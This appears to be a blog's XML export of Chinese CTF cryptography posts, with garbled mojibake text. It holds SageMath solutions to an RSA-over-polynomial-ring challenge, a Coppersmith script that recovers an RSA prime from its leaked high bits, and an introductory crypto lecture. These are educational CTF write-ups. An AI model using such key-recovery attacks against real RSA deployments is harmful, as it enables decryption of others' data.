<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">R.&lt;y&gt; = PolynomialRing(GF(43753))</span><br><span class="line">N = 34036*y^177 + 23068*y^176 + 13147*y^175 + 36344*y^174 + 10045*y^173 + 41049*y^172 + 17786*y^171 + 16601*y^170 + 7929*y^169 + 37570*y^168 + 990*y^167 + 9622*y^166 + 39273*y^165 + 35284*y^164 + 15632*y^163 + 18850*y^162 + 8800*y^161 + 33148*y^160 + 12147*y^159 + 40487*y^158 + 6407*y^157 + 34111*y^156 + 8446*y^155 + 21908*y^154 + 16812*y^153 + 40624*y^152 + 43506*y^151 + 39116*y^150 + 33011*y^149 + 23914*y^148 + 2210*y^147 + 23196*y^146 + 43359*y^145 + 34455*y^144 + 17684*y^143 + 25262*y^142 + 982*y^141 + 24015*y^140 + 27968*y^139 + 37463*y^138 + 10667*y^137 + 39519*y^136 + 31176*y^135 + 27520*y^134 + 32118*y^133 + 8333*y^132 + 38945*y^131 + 34713*y^130 + 1107*y^129 + 43604*y^128 + 4433*y^127 + 18110*y^126 + 17658*y^125 + 32354*y^124 + 3219*y^123 + 40238*y^122 + 10439*y^121 + 3669*y^120 + 8713*y^119 + 21027*y^118 + 29480*y^117 + 5477*y^116 + 24332*y^115 + 43480*y^114 + 33406*y^113 + 43121*y^112 + 1114*y^111 + 17198*y^110 + 22829*y^109 + 24424*y^108 + 16523*y^107 + 20424*y^106 + 36206*y^105 + 41849*y^104 + 3584*y^103 + 26500*y^102 + 31897*y^101 + 34640*y^100 + 27449*y^99 + 30962*y^98 + 41434*y^97 + 22125*y^96 + 24314*y^95 + 3944*y^94 + 18400*y^93 + 38476*y^92 + 28904*y^91 + 27936*y^90 + 41867*y^89 + 25573*y^88 + 25659*y^87 + 33443*y^86 + 18435*y^85 + 5934*y^84 + 38030*y^83 + 17563*y^82 + 24086*y^81 + 36782*y^80 + 20922*y^79 + 38933*y^78 + 23448*y^77 + 10599*y^76 + 7156*y^75 + 29044*y^74 + 23605*y^73 + 7657*y^72 + 28200*y^71 + 2431*y^70 + 3860*y^69 + 23259*y^68 + 14590*y^67 + 33631*y^66 + 15673*y^65 + 36049*y^64 + 29728*y^63 + 22413*y^62 + 18602*y^61 + 18557*y^60 + 23505*y^59 + 17642*y^58 + 12595*y^57 + 17255*y^56 + 15316*y^55 + 8948*y^54 + 38*y^53 + 40329*y^52 + 9823*y^51 + 5798*y^50 + 6379*y^49 + 8662*y^48 + 34640*y^47 + 38321*y^46 + 18760*y^45 + 13135*y^44 + 15926*y^43 + 34952*y^42 + 28940*y^41 + 13558*y^40 + 42579*y^39 + 38015*y^38 + 33788*y^37 + 12381*y^36 + 195*y^35 + 13709*y^34 + 31500*y^33 + 32994*y^32 + 30486*y^31 + 40414*y^30 + 2578*y^29 + 30525*y^28 + 43067*y^27 + 6195*y^26 + 36288*y^25 + 23236*y^24 + 21493*y^23 + 15808*y^22 + 34500*y^21 + 6390*y^20 + 42994*y^19 + 42151*y^18 + 19248*y^17 + 19291*y^16 + 8124*y^15 + 40161*y^14 + 24726*y^13 + 31874*y^12 + 30272*y^11 + 30761*y^10 + 2296*y^9 + 11017*y^8 + 16559*y^7 + 28949*y^6 + 40499*y^5 + 22377*y^4 + 33628*y^3 + 30598*y^2 + 4386*y + 23814</span><br><span class="line">print(factor(N))</span><br><span class="line">S.&lt;x&gt; = R.quotient(N)</span><br><span class="line">e = 65537</span><br><span class="line">phi = (43753^65-1)*(43753^112-1)# phiæ˜¯ä¸é«˜äºP(y)å¹‚çº§çš„ç¯å†…æ‰€æœ‰å¤šé¡¹å¼ä¸­ï¼Œä¸P(y)æ— å…¬å› å¼çš„å…¶ä»–å¤šé¡¹å¼çš„ä¸ªæ•°</span><br><span class="line">d = inverse_mod(e, phi)</span><br><span class="line">c = 5209*x^176 + 10881*x^175 + 31096*x^174 + 23354*x^173 + 28337*x^172 + 15982*x^171 + 13515*x^170 + 21641*x^169 + 10254*x^168 + 34588*x^167 + 27434*x^166 + 29552*x^165 + 7105*x^164 + 22604*x^163 + 41253*x^162 + 42675*x^161 + 21153*x^160 + 32838*x^159 + 34391*x^158 + 832*x^157 + 720*x^156 + 22883*x^155 + 19236*x^154 + 33772*x^153 + 5020*x^152 + 17943*x^151 + 26967*x^150 + 30847*x^149 + 10306*x^148 + 33966*x^147 + 43255*x^146 + 20342*x^145 + 4474*x^144 + 3490*x^143 + 38033*x^142 + 11224*x^141 + 30565*x^140 + 31967*x^139 + 32382*x^138 + 9759*x^137 + 1030*x^136 + 32122*x^135 + 42614*x^134 + 14280*x^133 + 16533*x^132 + 32676*x^131 + 43070*x^130 + 36009*x^129 + 28497*x^128 + 2940*x^127 + 9747*x^126 + 22758*x^125 + 16615*x^124 + 14086*x^123 + 13038*x^122 + 39603*x^121 + 36260*x^120 + 32502*x^119 + 17619*x^118 + 17700*x^117 + 15083*x^116 + 11311*x^115 + 36496*x^114 + 1300*x^113 + 13601*x^112 + 43425*x^111 + 10376*x^110 + 11551*x^109 + 13684*x^108 + 14955*x^107 + 6661*x^106 + 12674*x^105 + 21534*x^104 + 32132*x^103 + 34135*x^102 + 43684*x^101 + 837*x^100 + 29311*x^99 + 4849*x^98 + 26632*x^97 + 26662*x^96 + 10159*x^95 + 32657*x^94 + 12149*x^93 + 17858*x^92 + 35805*x^91 + 19391*x^90 + 30884*x^89 + 42039*x^88 + 17292*x^87 + 4694*x^86 + 1497*x^85 + 1744*x^84 + 31071*x^83 + 26246*x^82 + 24402*x^81 + 22068*x^80 + 39263*x^79 + 23703*x^78 + 21484*x^77 + 12241*x^76 + 28821*x^75 + 32886*x^74 + 43075*x^73 + 35741*x^72 + 19936*x^71 + 37219*x^70 + 33411*x^69 + 8301*x^68 + 12949*x^67 + 28611*x^66 + 42654*x^65 + 6910*x^64 + 18523*x^63 + 31144*x^62 + 21398*x^61 + 36298*x^60 + 27158*x^59 + 918*x^58 + 38601*x^57 + 4269*x^56 + 5699*x^55 + 36444*x^54 + 34791*x^53 + 37978*x^52 + 32481*x^51 + 8039*x^50 + 11012*x^49 + 11454*x^48 + 30450*x^47 + 1381*x^46 + 32403*x^45 + 8202*x^44 + 8404*x^43 + 37648*x^42 + 43696*x^41 + 34237*x^40 + 36490*x^39 + 41423*x^38 + 35792*x^37 + 36950*x^36 + 31086*x^35 + 38970*x^34 + 12439*x^33 + 7963*x^32 + 16150*x^31 + 11382*x^30 + 3038*x^29 + 20157*x^28 + 23531*x^27 + 32866*x^26 + 5428*x^25 + 21132*x^24 + 13443*x^23 + 28909*x^22 + 42716*x^21 + 6567*x^20 + 24744*x^19 + 8727*x^18 + 14895*x^17 + 28172*x^16 + 30903*x^15 + 26608*x^14 + 27314*x^13 + 42224*x^12 + 42551*x^11 + 37726*x^10 + 11203*x^9 + 36816*x^8 + 5537*x^7 + 20301*x^6 + 17591*x^5 + 41279*x^4 + 7999*x^3 + 33753*x^2 + 34551*x + 9659</span><br><span class="line">print(c^d)</span><br><span class="line"># 125*x^62 + 111*x^61 + 114*x^60 + 117*x^59 + 53*x^58 + 51*x^57 + 51*x^56 + 100*x^55 + 106*x^54 + 110*x^53 + 102*x^52 + 106*x^51 + 100*x^50 + 104*x^49 + 101*x^48 + 117*x^47 + 52*x^46 + 52*x^45 + 57*x^44 + 48*x^43 + 50*x^42 + 107*x^41 + 35*x^40 + 101*x^39 + 114*x^38 + 117*x^37 + 99*x^36 + 101*x^35 + 115*x^34 + 110*x^33 + 105*x^32 + 95*x^31 + 116*x^30 + 117*x^29 + 98*x^28 + 95*x^27 + 110*x^26 + 117*x^25 + 102*x^24 + 95*x^23 + 115*x^22 + 105*x^21 + 95*x^20 + 97*x^19 + 101*x^18 + 107*x^17 + 105*x^16 + 95*x^15 + 109*x^14 + 111*x^13 + 114*x^12 + 102*x^11 + 95*x^10 + 65*x^9 + 83*x^8 + 82*x^7 + 123*x^6 + 114*x^5 + 118*x^4 + 101*x^3 + 116*x^2 + 97*x + 119</span><br></pre></td></tr></table></figure>
<h3 id="coppersmithæ”»å‡»å·²çŸ¥pé«˜ä½">coppersmithæ”»å‡»:å·²çŸ¥pé«˜ä½</h3>
<h4 id="æ•°å­¦åŸºç¡€æ ¼åŸºè§„çº¦">æ•°å­¦åŸºç¡€ï¼šæ ¼åŸºè§„çº¦</h4>
<p><a href="https://security.feishu.cn/link/safety?target=https://blog.csdn.net/qq_42667481/article/details/117883231&amp;scene=ccm&amp;logParams=%7B%22location%22:%22ccm_drive%22%7D&amp;lang=zh-CN">æ ¼åŸºè§„çº¦ç®—æ³•ï¼šæ•°å­¦åŸºç¡€_éšç¼˜æ‡‚ç‚¹å¯†ç å­¦çš„åšå®¢-CSDNåšå®¢_æ ¼åŸºçº¦åŒ–ç®—æ³•</a></p>
<p><a href="https://security.feishu.cn/link/safety?target=https://blog.csdn.net/qq_42667481/article/details/118332181&amp;scene=ccm&amp;logParams=%7B%22location%22:%22ccm_drive%22%7D&amp;lang=zh-CN">æ ¼åŸºè§„çº¦ç®—æ³•ï¼šç®—æ³•è¯¦è§£_éšç¼˜æ‡‚ç‚¹å¯†ç å­¦çš„åšå®¢-CSDNåšå®¢_æ ¼åŸºè§„çº¦</a></p>
<p>[LLLç®—æ³•åœ¨RSAå®‰å…¨åˆ†æä¸­çš„åº”ç”¨][LLLç®—æ³•åœ¨RSAå®‰å…¨æ€§åˆ†æä¸­çš„åº”ç”¨_çŸ¥ç½‘ç™¾ç§‘ (cnki.net)](https://security.feishu.cn/link/safety?target=https://xuewen.cnki.net/ArticleCatalog.aspx?filename=1013353564.nh&amp;dbtype=CMFD&amp;dbname=CMFD201401&amp;scene=ccm&amp;logParams={"location":"ccm_drive"}&amp;lang=zh-CN)</p>
<p>pä¸º1024ä½æ—¶ï¼Œéœ€æœ€é«˜çŸ¥é“pçš„é«˜ä½çš„576ä½ï¼Œä½æ•°ä¸å¤Ÿæ—¶éœ€çˆ†ç ´ã€‚ <span class="math display">\[ åœ¨è¿™ä¸ªé—®é¢˜ä¸­ï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯æ‰¾åˆ°æ¨¡Næ„ä¹‰ä¸‹å¤šé¡¹å¼fæ‰€æœ‰çš„æ ¹ï¼Œé€šè¿‡LLLç®—æ³•ï¼Œæˆ‘ä»¬èƒ½æ‰¾åˆ°\ ä¸è¯¥å¤šé¡¹å¼å…·æœ‰ç›¸åŒçš„æ ¹x_0,\ æ›´å°ç³»æ•°ï¼Œ\ å®šä¹‰åœ¨æ•´æ•°åŸŸï¼Œ\ ä¸Šçš„å¤šé¡¹å¼gã€‚ä»è€Œæˆ‘ä»¬å°±å¾—åˆ°äº†åŸå¤šé¡¹å¼åœ¨æ¨¡æ„ä¹‰ä¸‹çš„æ•´æ•°æ ¹. \]</span></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from sage.all import *</span><br><span class="line">n = 25348605574630284342864323710011622959543974652863854537355760576386763162531478272446867731299572532294812374775121121761898206639041068156270466457595336452690367719842145233764550634280981441631262047763246059814963741143303914063537003244814908763379320576260885158458898112416692583017869283284022878603506583499699525249773663841642694427307104140944360804367072787670581252816486834658346431010523135392357008103555699542414687172408709153334263858639251735462278292703380745537045458408951791720967957274781161667526873251066303708008043058246747534357368350540174588670636827470901518225473676343782182718627</span><br><span class="line">p4 =0x3e67e7cacd2584224fb2026b40afbcc4281bd59f72f7801239d95c61c48ded7649924f794592fce806e032f16c2f4a90466905fc30037317074a6424d8bf078e959a1ed2d8e5c000 </span><br><span class="line">e = 0x10001</span><br><span class="line">pbits = 1024</span><br><span class="line">for i in range(0,4096):</span><br><span class="line">    p4=0x3e67e7cacd2584224fb2026b40afbcc4281bd59f72f7801239d95c61c48ded7649924f794592fce806e032f16c2f4a90466905fc30037317074a6424d8bf078e959a1ed2d8e5c000</span><br><span class="line">    p4=p4+int(hex(i),16)</span><br><span class="line">    kbits = pbits - p4.nbits()</span><br><span class="line">    p4 = p4 &lt;&lt; kbits</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    f = x + p4</span><br><span class="line">    roots = f.small_roots(X=2^kbits, beta=0.4)</span><br><span class="line">    if roots:</span><br><span class="line">        p = p4+int(roots[0])</span><br><span class="line">        print( &quot;n: &quot;, n)</span><br><span class="line">        print(&quot;p: &quot;, p)</span><br><span class="line">        print (&quot;q: &quot;, n//p)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¬¬ä¸‰æ¬¡ä¾‹ä¼š-å¯†ç å­¦å…¥é—¨</title>
    <url>/2022/10/11/%E7%AC%AC%E4%B8%89%E6%AC%A1%E4%BE%8B%E4%BC%9A-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1 id="å¯†ç å­¦å…¥é—¨">å¯†ç å­¦å…¥é—¨</h1>
<h2 id="å¤å…¸å¯†ç ">å¤å…¸å¯†ç </h2>
<h3 id="å‡¯æ’’">å‡¯æ’’</h3>
<p>æ›¿æ¢åŠ å¯†ç®—æ³•ï¼Œ26ä¸ªå­—æ¯åœ¨è¡¨ä¸Šå¾ªç¯ï¼Œå‘å‰æˆ–å‘åç§»nä¸ªå­—æ¯ã€‚åŠ å¯†åç§»ï¼Œè§£å¯†å‰ç§»ã€‚<a href="https://ctf.bugku.com/tool/caesar">å‡¯æ’’</a></p>
<h3 id="å˜å¼‚å‡¯æ’’">å˜å¼‚å‡¯æ’’</h3>
<p>æ›¿æ¢åŠ å¯†ç®—æ³•ï¼Œå¾ªç¯é¡ºåºå˜ä¸ºåœ¨asciiç è¡¨ä¸Šå¾ªç¯ã€‚</p>
<span id="more"></span>
<h3 id="ç»´å‰å°¼äºšåŠ å¯†">ç»´å‰å°¼äºšåŠ å¯†</h3>
<p>æœ‰å­—æ¯è¡¨ä½œä¸ºå¯¹ç…§<img src="https://s2.loli.net/2022/10/11/FUEakgDSHZbK713.png"></p>
<p>å‡è®¾æ˜æ–‡æ˜¯ATTACKï¼Œå¯†é’¥æ˜¯CATï¼ŒåŠ å¯†å°†å¯†é’¥é‡å¤è‡³ä¸æ˜æ–‡ç›¸åŒé•¿åº¦ï¼ŒCATCATï¼Œä¸€ä¸€å¯¹åº”æŸ¥è¡¨åŠ å¯†ã€‚å¯†æ–‡åˆ™æ˜¯CTMCCDã€‚</p>
<h3 id="è¯é¢‘åˆ†æ">è¯é¢‘åˆ†æ</h3>
<p>ä¸€æ®µæ–‡ç« é‡Œï¼Œç‰¹å®šçš„å­—æ¯å‡ºç°çš„é¢‘ç‡åŸºæœ¬å›ºå®šä¸å˜ã€‚æ¯”å¦‚å­—æ¯eå‡ºç°çš„é¢‘ç‡æœ€é«˜ï¼Œä¸º0.12702ï¼Œå°±å¯ä»¥åˆ†æå¯†æ–‡çš„å­—æ¯é¢‘ç‡è¿˜åŸæ˜æ–‡ã€‚</p>
<p>æˆ–è€…çŸ¥é“æ›¿æ¢å­—æ¯ï¼Œæ¯”å¦‚MTHJ{CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO}ï¼Œ<a href="https://quipqiup.com/">quipqiup</a></p>
<h2 id="ç°ä»£å¯†ç ">ç°ä»£å¯†ç </h2>
<p>ç°ä»£å¯†ç ä¸å¤å…¸å¯†ç çš„åŒºåˆ«å°±æ˜¯åŠ å¯†ç®—æ³•æ˜¯å¦å…¬å¼€çš„åŒºåˆ«ã€‚</p>
<h3 id="ç†è®ºå®‰å…¨ä¸å®é™…å®‰å…¨">ç†è®ºå®‰å…¨ä¸å®é™…å®‰å…¨</h3>
<p>ç†è®ºå®‰å…¨ï¼Œæˆ–æ— æ¡ä»¶å®‰å…¨ï¼šæ”»å‡»è€…æ— è®ºæˆªè·å¤šå°‘å¯†æ–‡ï¼Œéƒ½æ— æ³•å¾—åˆ°è¶³å¤Ÿçš„ä¿¡æ¯æ¥å”¯ä¸€åœ°å†³å®šæ˜æ–‡ã€‚Shannonç”¨ç†è®ºè¯æ˜ï¼šæ¬²è¾¾ç†è®ºå®‰å…¨ï¼ŒåŠ å¯†å¯†é’¥é•¿åº¦å¿…é¡»å¤§äºç­‰äºæ˜æ–‡é•¿åº¦ï¼Œå¯†é’¥åªç”¨ä¸€æ¬¡ï¼Œç”¨å®Œå³ä¸¢ï¼Œå³ä¸€æ¬¡ä¸€å¯†ã€‚</p>
<p>å®é™…å®‰å…¨ï¼Œæˆ–è®¡ç®—ä¸Šå®‰å…¨ï¼šå¦‚æœæ”»å‡»è€…æ‹¥æœ‰æ— é™èµ„æºï¼Œä»»ä½•å¯†ç ç³»ç»Ÿéƒ½æ˜¯å¯ä»¥è¢«ç ´è¯‘çš„ï¼›ä½†æ˜¯ï¼Œåœ¨æœ‰é™çš„èµ„æºèŒƒå›´å†…ï¼Œæ”»å‡»è€…éƒ½ä¸èƒ½é€šè¿‡ç³»ç»Ÿçš„åˆ†ææ–¹æ³•æ¥ç ´è§£ç³»ç»Ÿï¼Œåˆ™ç§°è¿™ä¸ªç³»ç»Ÿæ˜¯è®¡ç®—ä¸Šå®‰å…¨çš„æˆ–ç ´è¯‘è¿™ä¸ªç³»ç»Ÿæ˜¯è®¡ç®—ä¸Šä¸å¯è¡Œã€‚</p>
<h3 id="åˆ†ç»„å¯†ç des">åˆ†ç»„å¯†ç ï¼šDES</h3>
<p>æ˜æ–‡åŠ å¯†16è½®ï¼Œåˆå§‹çš„å¯†é’¥ç»è¿‡16è½®å˜æ¢äº§ç”Ÿ16ä¸ªå­å¯†é’¥ç”¨æ¥åŠ å¯†æ¯ä¸€è½®äº§ç”Ÿçš„å¯†æ–‡ã€‚</p>
<p><img src="https://s2.loli.net/2022/10/11/tbLr3FDqVIGemK8.png"></p>
<p>å¯†é’¥è½¬æ¢ä¸å·¦æ—‹ä½æ•°æœ‰è½¬æ¢è¡¨ä½œä¸ºå¯¹ç…§ã€‚</p>
<p>åŠ è§£å¯†è¿‡ç¨‹</p>
<p><img src="https://s2.loli.net/2022/10/11/Pb3cYmQ8WivVN1S.png"></p>
<p>DESå·²ç»è¢«è¯æ˜æ˜¯ä¸å®‰å…¨çš„ï¼Œå¯†é’¥å¯ä»¥é€šè¿‡ç©·ä¸¾æ‰¾å‡ºã€‚ç°åœ¨ä¸€èˆ¬é‡‡ç”¨3DESæˆ–è€…AESã€‚</p>
<h3 id="åˆ†ç»„å¯†ç çš„å·¥ä½œæ¨¡å¼">åˆ†ç»„å¯†ç çš„å·¥ä½œæ¨¡å¼</h3>
<h4 id="ç”µå­å¯†ç æœ¬æ¨¡å¼ecb">ç”µå­å¯†ç æœ¬æ¨¡å¼ï¼ŒECB</h4>
<p><img src="https://s2.loli.net/2022/10/11/rqBjypQkZUKcIlR.png"></p>
<p>ECBæ¨¡å¼ç‰¹åˆ«é€‚åˆæ•°æ®è¾ƒå°‘çš„æƒ…å†µï¼Œå¦‚å®‰å…¨ä¼ è¾“å¯†é’¥ã€‚ä¸€æ®µæ˜æ–‡æ¶ˆæ¯ä¸­è‹¥æœ‰å‡ ä¸ªç›¸åŒçš„æ˜æ–‡ç»„ï¼Œåˆ™å¯†æ–‡ä¹Ÿå°†å‡ºç°å‡ ä¸ªç›¸åŒçš„ç‰‡æ®µã€‚å¯¹äºå¾ˆé•¿çš„æ¶ˆæ¯ï¼ŒECBæ˜¯ä¸å®‰å…¨çš„ï¼Œå¦‚æœæ¶ˆæ¯æ˜¯éå¸¸ç»“æ„åŒ–çš„ï¼Œå¯†ç åˆ†æå¯èƒ½åˆ©ç”¨å…¶ç»“æ„ç‰¹å¾æ¥ç ´è§£ã€‚</p>
<h4 id="å¯†æ–‡åˆ†ç»„é“¾æ¥æ¨¡å¼-cbc">å¯†æ–‡åˆ†ç»„é“¾æ¥æ¨¡å¼ CBC</h4>
<p><img src="https://s2.loli.net/2022/10/11/uUBEFt2SGnIyfzw.png"></p>
<p>åŠ å¯†è¾“å…¥æ˜¯å½“å‰æ˜æ–‡åˆ†ç»„å’Œå‰ä¸€å¯†æ–‡åˆ†ç»„çš„å¼‚æˆ–</p>
<h4 id="å¯†ç åé¦ˆæ¨¡å¼-cfb">å¯†ç åé¦ˆæ¨¡å¼ CFB</h4>
<p><img src="https://s2.loli.net/2022/10/11/hZmBrlfAvgQ5Vqk.png"></p>
<p>å…ˆåŠ å¯†åˆå§‹å‘é‡å†å¼‚æˆ–ï¼Œå¼‚æˆ–ç»“æœä½œä¸ºä¸‹ä¸€è½®å¯†é’¥</p>
<h4 id="è¾“å‡ºåé¦ˆæ¨¡å¼-ofb">è¾“å‡ºåé¦ˆæ¨¡å¼ OFB</h4>
<p><img src="https://s2.loli.net/2022/10/11/mwD7iq9PhcO84Kz.png"></p>
<p>åŠ å¯†ç»“æœä½œä¸ºä¸‹ä¸€è½®å¯†é’¥</p>
<h3 id="å…¬é’¥å¯†ç rsa">å…¬é’¥å¯†ç ï¼šRSA</h3>
<p>RSAæ˜¯ctfæ¯”èµ›ä¸­æœ€å¸¸è§çš„åŠ å¯†ç®—æ³•ï¼Œæœ‰å¤šç§å¤šæ ·çš„æ”»å‡»æ–¹å¼ã€‚</p>
<h4 id="åŠ è§£å¯†ç®—æ³•">åŠ è§£å¯†ç®—æ³•</h4>
<p><span class="math display">\[
è´¹é©¬å°å®šç†ï¼šè‹¥pæ˜¯ç´ æ•°ï¼Œaæ˜¯æ­£æ•´æ•°ä¸”ä¸èƒ½è¢«pæ•´é™¤ï¼Œåˆ™a^{p-1}modp \equiv  1ï¼Œé‚£ä¹ˆa^{p}modp \equiv a\\
æ¬§æ‹‰å‡½æ•°ï¼š\phi(n)çš„å€¼æ˜¯ä»1åˆ°n-1å’Œnäº’è´¨çš„æ•°çš„æ•°é‡ã€‚\\
æ˜¾ç„¶ï¼Œå¯¹äºè´¨æ•°n \phi(n)=n-1ï¼Œå¦‚æœnä¸ºä¸¤ä¸ªè´¨æ•°på’Œqçš„ä¹˜ç§¯ï¼Œ\phi(n)=(p-1)*(q-1).\\
æ¬§æ‹‰å®šç†ï¼šå¯¹äºä»»æ„äº’è´¨çš„aå’Œnæœ‰ï¼ša^{\phi(n)}\equiv1modn.\\
RSAåŠ å¯†ç®—æ³•ï¼šéšæœºé€‰æ‹©ä¸¤ä¸ªå¤§ç´ æ•°på’Œqï¼Œè®¡ç®—n=p*qä»¥åŠphi=(p-1)*(q-1).\\
é€‰æ‹©ä¸€ä¸ªä¸\phi(n)äº’è´¨çš„æ•°eä½œä¸ºåŠ å¯†æŒ‡æ•°ï¼Œå¯¹eæ±‚å…³äºphiçš„é€†ä½œä¸ºdï¼Œå³ed\equiv1mod\phi(n).\\
åŠ å¯†ï¼šc=m^emodn\\
è§£å¯†ï¼šm=c^dmodn=(m^emodn)^dmodn=m.
\]</span></p>
<h3 id="å…¬é’¥å¯†ç elgamal">å…¬é’¥å¯†ç ï¼šElgamal</h3>
<p>å‡è®¾Aå’ŒBäº’ç›¸é€šä¿¡ï¼Œå…±äº«å¤§ç´ æ•°pï¼Œæœ¬åŸå…ƒç´ <span class="math inline">\(\alpha\)</span>ï¼Œæ˜æ–‡m&lt;pï¼Œé€šä¿¡æ—¶Açš„ç§é’¥ä¸º<span class="math inline">\(x_a\)</span>ï¼Œå…¬é’¥ä¸º<span class="math inline">\(Y_a=\alpha^{x_a}modp\)</span>ï¼ŒBçš„ç§é’¥ä¸º<span class="math inline">\(x_b\)</span>ï¼Œå…¬é’¥ä¸º<span class="math inline">\(Y_b=\alpha^{x_b}modp\)</span>ï¼ŒAå‘Bå‘é€æ¶ˆæ¯ï¼Œè®¡ç®—K=<span class="math inline">\(Y_b^{x_a}modp\)</span>=<span class="math inline">\(\alpha^{x_ax_b}modp\)</span>ï¼Œ<span class="math inline">\(c_1=\alpha^{x_a}modpï¼Œc_2=mKmodp\)</span>ï¼Œå¯†æ–‡å³ä¸º(<span class="math inline">\(c_1ï¼Œc_2\)</span>)ã€‚</p>
<p>Bæ”¶åˆ°ä¿¡æ¯åï¼Œé¦–å…ˆæ¢å¤Kï¼ŒK=<span class="math inline">\(c_1^{x_b}modp\)</span>ï¼Œç„¶åm=<span class="math inline">\(c_2/Kmodp\)</span>.</p>
<p>æ¯æ¬¡éšæœºé€‰æ‹©ç§é’¥å‘é€ä¿¡æ¯ï¼ŒåŒæ ·çš„å¯†æ–‡æ¯æ¬¡åŠ å¯†å‡ºä¸åŒçš„å¯†æ–‡ã€‚</p>
<h3 id="å…¬é’¥å¯†ç ecc">å…¬é’¥å¯†ç ï¼šECC</h3>
<p>æœ€ç®€å•çš„ä¸€ç±»æ¤­åœ†æ›²çº¿ï¼š<span class="math inline">\(y^2=x^3+ax+b\)</span>.</p>
<figure>
<img src="https://s2.loli.net/2022/10/11/HTgMhofD4AtijC1.png" alt="image.png"><figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>åŠ æ³•ä¸ä¹˜æ³•çš„å®šä¹‰ï¼šè¿çº¿ä¸åˆ‡çº¿ã€‚</p>
<p>åŠ å¯†æ—¶ï¼ŒAé€‰å–ä¸€æ¡æ¤­åœ†æ›²çº¿<span class="math inline">\(E_p(a,b)\)</span>å¹¶é€‰æ‹©å…¶ä¸­ä¸€ç‚¹Gï¼Œé€‰å–ç§é’¥kè®¡ç®—kGä½œä¸ºå…¬é’¥ã€‚</p>
<p>Aå°†Eï¼ŒKï¼ŒGå‘é€ç»™Bã€‚</p>
<p>Bå°†æ˜æ–‡mè½¬æ¢ä¸ºEä¸Šçš„ä¸€ä¸ªç‚¹Mï¼Œå¹¶ç”Ÿæˆä¸€ä¸ªéšæœºæ•°rï¼Œè®¡ç®—<span class="math inline">\(c_1=M+rKï¼Œc_2=rG\)</span>ï¼Œå‘é€<span class="math inline">\(c_1,c_2\)</span></p>
<p>Aè®¡ç®—<span class="math inline">\(c_1-kc_2\)</span>å³å¯è§£å¯†ã€‚</p>
<h3 id="æ ¼å¯†ç ">æ ¼å¯†ç </h3>
<p>æ¶‰åŠçº¿ä»£çŸ¥è¯†ï¼Œç›®å‰é˜¶æ®µä¸ä½œä¸ºé‡ç‚¹ã€‚</p>
<h2 id="ä½œä¸š">ä½œä¸š</h2>
<ol type="1">
<li><div class="sourceCode" id="cb1"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>   <span class="co"># flag * 2 ** 10000 mod 10**175 = x</span></span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>   <span class="co"># flag * 2 ** 10000 = y * 2 ** 175 + k * 10 ** 175</span></span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>   <span class="co"># flag * 2 ** 9825 = y mod 5 ** 175</span></span>
<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>   <span class="bu">print</span>(gmpy2.invert(<span class="dv">2</span> <span class="op">**</span> <span class="dv">9825</span>, <span class="dv">5</span> <span class="op">**</span> <span class="dv">175</span>))</span>
<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>   y <span class="op">=</span> <span class="dv">1473327817893791860679080635376845598464916175771199125558742418628097409377550464912703622357336416382120404612476355317875179245511879304348013049276070451780858374753615872</span> <span class="op">//</span> (<span class="dv">2</span> <span class="op">**</span> <span class="dv">175</span>)</span>
<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>   <span class="bu">print</span>(y)</span>
<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a>   flag <span class="op">=</span> y <span class="op">*</span> gmpy2.invert(<span class="dv">2</span> <span class="op">**</span> <span class="dv">9825</span>, <span class="dv">5</span> <span class="op">**</span> <span class="dv">175</span>) <span class="op">%</span> (<span class="dv">5</span> <span class="op">**</span> <span class="dv">175</span>)</span>
<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>   <span class="bu">print</span>(long_to_bytes(flag))</span></code></pre></div></li>
</ol>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
  </entry>
</search>
